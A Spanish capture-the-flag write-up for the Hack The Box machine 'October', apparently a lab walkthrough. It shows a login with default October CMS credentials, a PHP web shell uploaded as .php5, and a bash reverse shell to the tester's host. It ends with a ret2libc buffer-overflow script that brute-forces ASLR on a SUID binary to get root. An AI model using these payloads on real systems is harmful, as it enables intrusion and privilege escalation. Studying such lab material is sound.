# 10.10.10.16 - October
![October](https://user-images.githubusercontent.com/96772264/205711527-23a17d1c-77f1-4db6-bff7-ff50d021fce3.png)
-----------------------

Puertos abiertos: 22(ssh), 80(http)
```console
└─$ whatweb http://10.10.10.16
[200 OK] Apache[2.4.7], Cookies[october_session],HttpOnly[october_session], Meta-Author[October CMS], PHP[5.5.9-1]
```
Tenemos una web, que nos piden registrarnos. Una vez hecho esto nos dan dos cookies.
```
october_session:eyJpdiI6ImVCXC9LbE4wYVBlNU5vV1ZIaW1neDFRPT0iLCJ2YWx1ZSI6InVDWGRUdmk4QjFjRWNjMVFRaFwvWjg0M2M5Y3czMWQ4U0k1V3AxbzFaYklFSDd5TU5nZ3IzT04wcVRHWWViS2xRXC8rcUhNb2x4Q0NNbEVXZlJMNVEzOHc9PSIsIm1hYyI6IjZmZjU1ZDRlNGE4YTQwYzdhMDQ0M2VjNzZjZDM0ODMxOTUwNzNmMzA3NDY2YzMwYzA1MTM1MDk5ODQ2NWJhZjcifQ%3D%3D
user_auth:eyJpdiI6IkhIQm8xaVc0TWNMTzR4WW1tQnlHZVE9PSIsInZhbHVlIjoiZlNnYTdUa20yM2NOMGNOakdUUm5vOVBQY1ozaVwvRkxzTk5YRkp5OEk5Mnc0Rk8yNnZKSFIyYkxYc1p3Vm41ZEplR2xoZHhTRVwvNDBXYmUrZ2xyT0tyOTB5blB3TjJqNDhpR2VHOXhxNU5TTytTQ2dYR00zVU5qXC80Sjd5Q2E4c2MiLCJtYWMiOiI0N2IyZjhmMTc4OGIwMzIwNTg5NDNjYzI4ZTkwODA4NzdiZjgzMzliNjg2YzZmYmM5Njk0Nzk0NzJiYzcxYjYzIn0%3D

{"iv":"eB\/KlN0aPe5NoWVHimgx1Q==","value":"uCXdTvi8B1cEcc1QQh\/Z843c9cw31d8SI5Wp1o1ZbIEH7yMNggr3ON0qTGYebKlQ\/+qHMolxCCMlEWfRL5Q38w==","mac":"6ff55d4e4a8a40c7a0443ec76cd3483195073f307466c30c051350998465baf7"}
```
![october1](https://user-images.githubusercontent.com/96772264/205711573-3fb469c3-64ff-479d-b67b-a6e89e48d69c.PNG)

La seccion de blog nos dice de poner "Una entrada mas interesante". Nos dan el link a /storage/app/media/dr.php5  También pone abajo un panel para comentar donde 
nos dejan poner markdown.

Ponemos : ```<script src="http://10.10.14.16/pwn.js"></script>``` pero no recibimos petición. El output se ve reflejado pero al poner ```{{7*7}}``` no sale 49
![october2](https://user-images.githubusercontent.com/96772264/205711604-ce104899-c133-4751-9e18-9ee52e4285eb.PNG)

HAciendo fuzzing encontre la ruta "backend" (100 hilos en vez de 200 por que da cierto error)
```console
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.16/FUZZ/
000000019:   200        103 L    230 W      4253 Ch     "blog"
000000070:   403        10 L     30 W       284 Ch      "icons"
000000336:   200        145 L    265 W      5089 Ch     "account"
000000054:   200        216 L    384 W      9598 Ch     "forum"
000000761:   302        11 L     22 W       400 Ch      "backend"
```

En backend nos piden creds, le pongo los mios y no me dejan, busco los creds por defecto de "october cms" que son ```admin:admin``` y entro con ellos.
![october3](https://user-images.githubusercontent.com/96772264/205711651-95cd03a5-d03e-42b0-bab5-853172de5a6f.PNG)
![october4](https://user-images.githubusercontent.com/96772264/205711664-e362a539-9321-46aa-a88b-2671ff678a17.PNG)

```<php shell_exec($_GET['cmd']); ?>```
En searchsploit si pones "october cms" te salen varias cosas, entre ellas uno de file upload. October cms no deja subir .php pero si .php5
```php
<?php 
    system($_GET['cmd']);
?>
```
Luego de poner en la ruta que nos dan ```bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'``` recibimos una consola al escuchar con netcat ```sudo nc -nlvp 443```
Entramos con la carpeta "/var/www/html/cms/storage/app/" Dos directorios mas atrás hay uno de config, esta bien mirar ahí en busca de credenciales
```console
www-data@october:/var/www/html/cms/config$ grep -rIE "password"
database.php:            'password'  => 'OctoberCMSPassword!!',
```
Pero no nos sirve ni para migrar al usaurio harry ni para conectarnos a la base de datos local. Enumerando mas encontramos un binario SUID "/usr/local/bin/ovrflw"
```console
└─$ sudo nc -nlvp 666 > ovrflw
www-data@october:/tmp$ cat "/usr/local/bin/ovrflw" | nc 10.10.14.16 666
```

```console
└─$ gdb ./ovrflw
gef➤ pattern create 120
gef➤ r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
SEG FAULT
$esp   : 0xffffd0d0  →  "eaab"
$ebp   : 0x62616163 ("caab"?)
$eip   : 0x62616164 ("daab"?)
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
```
A partir de 112 de input, se desborda el buffer. 

```console
└─$ python3 -c "print('A'* 112 + 'B' * 4)"
gef➤ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
$eip   : 0x42424242 ("BBBB"?)
```
Ya tenemos control del eip, pero en vez de redirigirlo a un sitio inutil mejor a una carga de código.
```console
www-data@october:/$ for i in $(seq 1 100); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'; done
(0xb7636000)
(0xb7605000)
(0xb756b000)
(0xb75e0000)
(0xb75e4000)
(0xb760f000)
```
El ASLR cambia cada dos por tres así que hay que coger una random como "0xb7548000"
```console
www-data@october:/$ ldd /usr/local/bin/ovrflw
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75cc000)
www-data@october:/$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@| exit@@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:/$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 162bac /bin/sh 
```
```python
import struct

junk = b"A" * 112
libc = 0xb7548000
system = struct.pack("<L", libc + 0x00040310)
exit = struct.pack("<L", libc + 0x00033260)
sh = struct.pack("<L", libc + 0x00162bac)
print(junk + system + exit + sh)
```
Ejecutas el script infinitas veces hasta que una de las direcciones sea la que hemos puesto nosotros.
```console
www-data@october:/tmp$ python exploit.py > ./payload
www-data@october:/tmp$ while true; do /usr/local/bin/ovrflw $(cat /tmp/payload); done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# whoami
root
# cat /root/root.txt
1bef37c2a94b79399a76172e417814fa
```
